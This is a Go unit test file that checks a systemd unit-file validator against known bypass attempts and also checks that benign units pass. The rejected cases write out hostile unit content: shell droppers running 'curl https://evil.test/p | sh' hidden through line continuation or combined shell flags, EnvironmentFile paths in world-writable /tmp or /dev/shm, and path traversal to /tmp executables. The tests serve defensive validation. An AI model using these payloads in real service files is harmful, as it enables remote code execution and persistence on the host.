package service

import (
	"errors"
	"testing"
)

func TestUnitContent_BypassRegressions(t *testing.T) {
	rejected := map[string]string{

		"line-continuation shell dropper": "[Service]\nExecStart=/bin/sh \\\n  -c 'curl https://evil.test/p | sh'\n",

		"combined -ec shell flag": "[Service]\nExecStart=/bin/bash -ec 'curl https://evil.test/p | sh'\n",
		"combined -xc shell flag": "[Service]\nExecStart=/usr/bin/sh -xc 'id'\n",

		"EnvironmentFile world-writable":             "[Service]\nEnvironmentFile=/tmp/evil.env\nExecStart=/usr/bin/true\n",
		"EnvironmentFile ignore-missing dev-shm":     "[Service]\nEnvironmentFile=-/dev/shm/x.env\nExecStart=/usr/bin/true\n",
		"line-continuation EnvironmentFile dev-shm":  "[Service]\nEnvironmentFile= \\\n /var/tmp/x.env\nExecStart=/usr/bin/true\n",
		"escaped backslash is not a continuation /1": "[Service]\nExecStart=/bin/sh -c 'echo hi'\\\\\n",

		"exec traversal /var/../tmp":                  "[Service]\nExecStart=/var/../tmp/evil\n",
		"exec traversal /./tmp with args":             "[Service]\nExecStart=/./tmp/evil --flag\n",
		"EnvironmentFile traversal /var/../tmp":       "[Service]\nEnvironmentFile=/var/../tmp/x.env\nExecStart=/usr/bin/true\n",
		"EnvironmentFile traversal ignore-missing /.": "[Service]\nEnvironmentFile=-/./tmp/x.env\nExecStart=/usr/bin/true\n",
	}
	for name, content := range rejected {
		t.Run("reject/"+name, func(t *testing.T) {
			if err := validateUnitContent(content); !errors.Is(err, ErrUnsafeUnitContent) {
				t.Errorf("validateUnitContent accepted a known bypass; err = %v\ncontent:\n%s", err, content)
			}
		})
	}

	allowed := []string{
		"[Service]\nExecStart=/usr/bin/myservice --flag value\n",
		"[Service]\nEnvironmentFile=/etc/myservice.env\nExecStart=/usr/bin/myservice\n",
		"[Service]\nExecStart=/usr/bin/foo \\\n  --bar baz\n",
		"[Service]\nEnvironment=FOO=bar BAZ=qux\nExecStart=/usr/bin/myservice\n",
		"[Service]\nExecStart=/opt/../usr/bin/myservice\n",
	}
	for i, content := range allowed {
		t.Run("allow/"+string(rune('a'+i)), func(t *testing.T) {
			if err := validateUnitContent(content); err != nil {
				t.Errorf("validateUnitContent rejected a legitimate unit: %v\ncontent:\n%s", err, content)
			}
		})
	}
}
